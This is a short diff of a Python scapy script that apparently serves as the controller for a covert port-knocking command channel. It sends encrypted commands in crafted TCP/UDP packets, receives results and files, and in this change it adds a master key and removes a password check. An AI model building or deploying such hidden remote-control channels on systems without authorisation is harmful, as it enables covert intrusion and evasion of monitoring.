@@ -23,9 +23,9 @@ def portKnock():
 
 def sendCommand(protocol, data, password):
     if protocol == "tcp":
-        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data))
+        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
     if protocol == "udp":
-        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data))
+        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
     send(packet, verbose=0)
 
 def recvCommand(packet):
@@ -38,12 +38,8 @@ def recvCommand(packet):
         if packet.haslayer(Raw):
             if packet[Raw].load == configfile.password:
                 flag = True
-                decryptedData = encryption.decrypt(Results)
-                if decryptedData.startswith(configfile.password):
-                    data = decryptedData[len(configfile.password):]
-                else:
-                    raise "Incorrect password in data."
-                print data
+                decryptedData = encryption.decrypt(Results, configfile.masterkey)
+                print decryptedData
                 Results = ""
 
 def recvFile(packet):
